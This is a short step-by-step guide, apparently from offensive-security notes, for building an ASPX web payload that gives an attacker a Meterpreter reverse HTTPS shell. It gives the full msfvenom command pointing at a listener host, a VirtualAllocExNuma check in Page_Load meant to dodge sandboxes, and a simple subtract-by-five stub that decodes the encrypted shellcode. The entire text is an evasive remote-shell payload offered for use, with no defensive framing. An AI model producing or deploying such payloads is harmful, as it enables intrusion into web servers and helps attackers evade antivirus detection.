1. Create a malicious .aspx file with msfvenom

```
~# msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.1.1 LPORT=443 enablestageencoding=true handlersslcert=justice.pem prependmigrate=true -f aspx -o met.aspx
```

2. Add the "VirtualAllocExNuma" and "GetCurrentProcess" C# signatures. Then add this piece of code under the "Page_Load" method:

```
         IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);
         if(mem == null)
         {
             return;
         }
```

3. Now, we will use the [encoder.cs]() file to encrypt the shellcode that msfvenom originally generated.

4. Finally, change the original shellcode for the encrypted one and add this decryption stub:

```
byte[] pLG0 = new byte[1165] { 0x01, 0x4d, 0x88, ... };
for(int i = 0; i < pLG0.Length; i++)
{
 pLG0[i] = (byte)(((uint)pLG0[i] - 5) & 0xFF);
}
```
